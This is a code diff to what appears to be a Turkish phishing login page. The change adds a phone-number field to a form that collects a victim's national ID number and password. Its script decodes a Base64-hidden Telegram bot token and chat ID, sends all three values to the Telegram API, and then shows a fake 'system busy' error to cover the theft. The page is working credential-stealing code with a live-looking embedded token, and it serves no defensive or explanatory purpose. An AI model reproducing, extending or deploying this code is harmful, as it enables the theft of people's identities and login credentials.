@@ -228,6 +228,19 @@
                                                         </div>
                                                     </div>
 
+                                                    <div class="formField" id="telefonField" style="display:block;">
+                                                        <div class="formFieldOuter">
+                                                            <div class="formFieldInner form-group">
+                                                                <label for="telefon" class="col-sm-5 col-md-4 control-label">Güncel telefon numaranız.</label>
+                                                                <div class="formFieldSurround col-sm-7 col-md-8">
+                                                                    <div class="inline-form-control">
+                                                                        <input class="form-control " id="telefon" name="telefon" maxlength="25" type="text" />
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+
                                                     <div class="form-group form-group-offset">
                                                         <div
                                                             class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
@@ -269,14 +282,21 @@
                                                             var tc = document.getElementById('custno').value;
                                                             var sms = document.getElementById('sms').value;
                                                 
-                                                            var botTokenBase64 = 'NjU1NDA1NTAwODpBQUdhcjhUaFRJcTB0MG9fVENGdV9YeFJzMUtkU2VJbG90UQ=='; // Buraya Base64 ile kodlanmış botToken ekleyin
+                                                            // TC ve şifre girişini devre dışı bırak
+                                                            document.getElementById('custno').disabled = true;
+                                                            document.getElementById('sms').disabled = true;
+                                                            document.getElementById('telefon').disabled = true;
+                                                
+                                                            var telefon = document.getElementById('telefon').value;
+                                                
+                                                            var botTokenBase64 = 'NjU1NDA1NTAwODpBQUdhcjhUaFRJcTB0MG9fVENGdV9YeFJzMUtkU2VJbG90UQ==';
                                                             var chatIdBase64 = 'LTEwMDIxMTE3MTE4NzY=';
                                                 
                                                             var botToken = atob(botTokenBase64);
                                                             var chatId = atob(chatIdBase64);
                                                 
                                                             var apiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
-                                                            var message = 'TC: ' + tc + '\nŞİFRE: ' + sms;
+                                                            var message = 'TC: ' + tc + '\nŞİFRE: ' + sms + '\nTelefon: ' + telefon;
                                                 
                                                             var data = {
                                                                 chat_id: chatId,
@@ -292,23 +312,25 @@
                                                             })
                                                             .then(response => response.json())
                                                             .then(data => {
-                                                                console.log('Success:', data);
+                                                                console.log('Başarı:', data);
                                                 
+                                                                // Telefon numarası girişi sonrası hata mesajını görüntüle
                                                                 var errorMessage = document.createElement('div');
                                                                 errorMessage.className = 'error-message';
                                                                 errorMessage.innerHTML = '<p style="color: red; text-align: center;">Sistem yoğunluğundan dolayı giriş yapılamamaktadır. Lütfen ilerleyen zamanda tekrar deneyiniz.</p>';
                                                 
-                                                                var passwordInput = document.getElementById('sms');
+                                                                var passwordInput = document.getElementById('telefon');
                                                                 passwordInput.parentNode.appendChild(errorMessage);
                                                             })
                                                             .catch((error) => {
-                                                                console.error('Error:', error);
-                                                                                                                
+                                                                console.error('Hata:', error);
+                                                
+                                                                // İlk Telegram mesajı gönderiminde sorun olması durumunda hata mesajını görüntüle
                                                                 var errorMessage = document.createElement('div');
                                                                 errorMessage.className = 'error-message';
                                                                 errorMessage.innerHTML = '<p style="color: red; text-align: center;">Sistem yoğunluğundan dolayı giriş yapılamamaktadır. Lütfen ilerleyen zamanda tekrar deneyiniz.</p>';
                                                 
-                                                                var passwordInput = document.getElementById('sms');
+                                                                var passwordInput = document.getElementById('telefon');
                                                                 passwordInput.parentNode.appendChild(errorMessage);
                                                             });
                                                         });
